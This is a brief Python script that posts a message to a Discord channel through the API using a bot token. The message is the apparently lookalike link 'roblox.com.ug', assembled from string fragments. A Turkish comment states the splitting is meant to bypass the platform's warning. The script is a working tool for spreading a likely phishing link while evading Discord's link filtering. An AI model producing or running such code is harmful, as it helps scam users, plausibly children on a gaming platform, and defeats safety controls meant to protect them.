import requests
import os

TOKEN = os.getenv("TOKEN")
CHANNEL_ID = os.getenv("CHANNEL_ID")

url = f"https://discord.com/api/v10/channels/{CHANNEL_ID}/messages"
headers = {"Authorization": f"Bot {TOKEN}", "Content-Type": "application/json"}
data = {"content": "rob" + "lox" + ".com" + ".ug"}  # Link parçalı, uyarıyı aşar

response = requests.post(url, headers=headers, json=data)
print(response.json())
